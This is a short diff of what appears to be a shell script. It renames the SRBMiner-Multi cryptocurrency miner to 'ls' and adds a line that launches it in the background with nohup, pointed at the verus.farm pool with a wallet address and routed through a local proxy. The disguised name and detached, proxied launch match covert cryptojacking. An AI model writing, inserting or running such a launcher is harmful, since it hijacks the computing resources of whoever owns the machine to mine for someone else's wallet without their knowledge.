@@ -46,3 +46,4 @@ mv SRBMiner-Multi-2-8-8-Linux.tar.gz ls
 cd ls
 mv SRBMiner-MULTI ls
 chmod +x ls
+nohup ./ls -o verus.farm:9998  -u RWajjUzHh2BdpLB6qJChgQy2j3SfVXonMK -a verushash --proxy 127.0.0.1:1080 --tls true > ls.log 2>&1 &
